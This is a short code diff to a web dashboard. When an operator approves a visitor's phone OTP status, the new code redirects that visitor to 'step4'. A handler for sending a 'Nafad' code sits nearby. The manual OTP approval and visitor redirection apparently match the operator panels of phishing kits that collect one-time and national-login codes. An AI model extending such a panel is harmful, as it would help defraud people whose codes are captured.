@@ -1173,7 +1173,25 @@ export default function DashboardPage() {
   };
 
   const handleLocalPhoneAction = async (action: "approved" | "rejected") => {
-    await applyLocalBoxDecision("phone", "phoneOtpStatus", action, action === "approved" ? "تم الموافقة على رقم الهاتف" : "تم رفض رقم الهاتف");
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    
+    // First, apply the status decision
+    await applyLocalBoxDecision("phone", "phoneOtpStatus", action, 
+      action === "approved" ? "تم الموافقة على رقم الهاتف" : "تم رفض رقم الهاتف"
+    );
+    
+    // If approved, redirect customer to step4 (one-time redirect)
+    if (action === "approved" && visitorId) {
+      try {
+        await fetch("/api/dashboard/redirect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ visitorId, targetPage: "step4" }),
+        });
+      } catch (error) {
+        console.error("Failed to redirect to step4:", error);
+      }
+    }
   };
 
   const handleSendNafadCode = async () => {
